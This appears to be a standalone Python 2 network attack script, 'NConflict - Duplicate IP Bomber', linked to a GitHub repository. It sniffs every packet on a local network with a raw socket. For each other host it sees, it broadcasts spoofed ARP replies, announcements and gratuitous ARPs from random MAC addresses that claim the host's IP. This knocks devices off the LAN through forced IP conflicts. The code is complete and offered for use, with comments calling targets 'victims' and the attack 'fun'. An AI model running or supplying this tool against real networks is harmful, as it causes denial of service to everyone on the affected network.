#NConflict - Duplicate IP Bomber in Python
#Advertising fake duplicate IP of all nodes for conflicting network. 
#NConflict - Conflicting network with some simple tricks : https://github.com/nimafia/NConflict

import socket
import sys
import random
import uuid
from struct import *
from scapy.all import (
    ARP,
    Ether,
    sendp
)


#Function For Generating Random Mac Address
def randomMAC():
    return [ 0x00, 0x16, 0x3e,
        random.randint(0x00, 0x7f),
        random.randint(0x00, 0xff),
        random.randint(0x00, 0xff) ]
		
def MACprettyprint(mac):
    return ':'.join(map(lambda x: "%02x" % x, mac))

#Convert a string of 6 characters of ethernet address into a dash separated hex string
def eth_addr (a) :
  b = "%.2x:%.2x:%.2x:%.2x:%.2x:%.2x" % (ord(a[0]) , ord(a[1]) , ord(a[2]), ord(a[3]), ord(a[4]) , ord(a[5]))
  return b
        
#Define My Ip Address
sip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sip.connect(("8.8.8.8", 80))
my_ip = sip.getsockname()[0]
sip.close()
#print 'My IP Address : ' + str(my_ip)

#Define My Mac Address
my_mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
#print 'My Mac Address : ' + str(my_mac)

#-------------Sniffing Incoming Packets and geting some require information----------------
#create a AF_PACKET type raw socket (thats basically packet level)
#define ETH_P_ALL    0x0003          /* Every packet (be careful!!!) */
try:
    s = socket.socket( socket.AF_PACKET , socket.SOCK_RAW , socket.ntohs(0x0003))
except socket.error , msg:
    print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()
 
# receive a packet
while True:
    packet = s.recvfrom(65565)
     
    #packet string from tuple
    packet = packet[0]
     
    #parse ethernet header
    eth_length = 14
     
    eth_header = packet[:eth_length]
    eth = unpack('!6s6sH' , eth_header)
    eth_protocol = socket.ntohs(eth[2])
    src_mac = eth_addr(packet[6:12])
    dst_mac = eth_addr(packet[0:6])
    #print 'Destination MAC : ' + str(dst_mac) + ' Source MAC : ' + str(src_mac) + ' Protocol : ' + str(eth_protocol)
 
    #Parse IP packets, IP Protocol number = 8
    if eth_protocol == 8 :
        #Parse IP header
        #take first 20 characters for the ip header
        ip_header = packet[eth_length:20+eth_length]
         
        #now unpack them :)
        iph = unpack('!BBHHHBBH4s4s' , ip_header)
 
        #version_ihl = iph[0]
        #version = version_ihl >> 4
        #ihl = version_ihl & 0xF
        #iph_length = ihl * 4
        #ttl = iph[5]
        #protocol = iph[6]
        src_ip = socket.inet_ntoa(iph[8]);
        dst_ip = socket.inet_ntoa(iph[9]);
                
                
#--------------------------------Have Some Fun :)-----------------------------------------
        if (src_ip != my_ip) | (src_mac != my_mac) :
            #generating random mac address
            rmac = MACprettyprint(randomMAC())
                
            #Responds directly to a victim for detect IP conflict
            pkt = Ether(dst=src_mac, src=rmac) / ARP(op=2 , hwsrc=rmac, psrc=src_ip, pdst=src_ip, hwdst=src_mac)
            pkt.show()
            sendp(pkt)
                        
            #ARP Announcement to officially claim the IP address on the network
            annarp = Ether(dst='ff:ff:ff:ff:ff:ff', src=rmac) / ARP(op=1 , hwsrc=rmac, psrc=src_ip, pdst=src_ip, hwdst='00:00:00:00:00:00')
            #annarp.show()
            sendp(annarp)
                        
            #Gratuitous ARP to update ARP mapping for all the nodes
            grarp = Ether(dst='ff:ff:ff:ff:ff:ff', src=rmac) / ARP(op=2 , hwsrc=rmac, psrc=src_ip, pdst=src_ip, hwdst='ff:ff:ff:ff:ff:ff')
            #grarp.show()
            sendp(grarp)
